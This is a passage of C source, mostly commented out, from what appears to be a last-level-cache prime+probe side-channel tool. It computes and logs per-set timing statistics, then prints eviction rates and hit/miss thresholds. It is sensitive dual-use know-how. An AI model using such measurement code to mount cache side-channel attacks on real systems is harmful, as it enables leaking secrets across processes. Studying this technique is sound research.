//		//analysellc(setidx, cache->numberofsets, setidx, cache, MAX_TIMES_TO_CSV * numberofsets);
//
//		//For N files
//		analysellc(cyclestartidx, cycleincrement, setidx, cache, MAX_TIMES_TO_CSV);
//		sprintf(nfilename, "%d", setidx);
//		nfilename = concat(concat(SCAN_CACHE_DATA_DIRECTORY, concat("SET_",nfilename)), "_prime_probe.data");
//		//arraytocsv(nfilename, MAX_TIMES_TO_CSV, cache->analysis);
//
//		means[setidx] = mean(cache->analysis, MAX_TIMES_TO_CSV);
//		standarddeviations[setidx] = standarddeviation(means[setidx], cache->analysis, MAX_TIMES_TO_CSV);
//		coefficientevariations[setidx] = coefficientvariation(standarddeviations[setidx],means[setidx]);
//
//		//delay
//		sleep(1);
//	}
//
//	nfilename = concat(concat(SCAN_CACHE_DATA_DIRECTORY, "MEANS_"), "_prime_probe.data");
//	logsetsstatistic(nfilename,means,numberofsets);
//
//	nfilename = concat(concat(SCAN_CACHE_DATA_DIRECTORY, "STANDARD_DEVIATIONS_"), "_prime_probe.data");
//	logsetsstatistic(nfilename,standarddeviations,numberofsets);
//
//	nfilename = concat(concat(SCAN_CACHE_DATA_DIRECTORY, "COEFFICIENT_VARIATIONS_"), "_prime_probe.data");
//	logsetsstatistic(nfilename,coefficientevariations,numberofsets);
//	//For 1 file
//	//arraytodatafilewithoutlabels(PROBE_ANALYSIS_DATA_FILENAME, cache->analysis,
//	//MAX_TIMES_TO_CSV, numberofsets);
//
//	disposecache(cache);


	//OBTAIN EVICTION DATA
//	preparecache(&cache, mappedsize, numberofsets, numberofways,
//			cachelinesize, bitsofoffset);
//
////	char filename[200] = "";
////	sprintf(filename, "%s%s", VARIATION_ANALYSIS_DATA_DIRECTORY,
////	VARIATION_ANALYSIS_DATA_FILENAME);
////
////	analysehitandmissvariation(mappedsize, filename, analysissize,
////			histogramsize, histogramscale);
//
//	obtainevictiondata(histogramsize, histogramscale, maxruns, evictiondata,
//			cache);
//	if (evictiondata->evictionrate > 50) {
//		if (evictiondata->maxhit >= evictiondata->maxmiss) {
//			printf("[!] Cycles of Hit >= Cycles of Miss [!]\n");
//		}
//		printf("Max Hit: %u\n", evictiondata->maxhit);
//		printf("Max Miss: %u\n", evictiondata->maxmiss);
//		printf("Threshold: %u\n", evictiondata->threshold);
//		printf("Hits Rate: %lf\%\n", evictiondata->hitsrate);
//		printf("Eviction Rate: %lf\%\n", evictiondata->evictionrate);
//	}
//
	return 0;
}
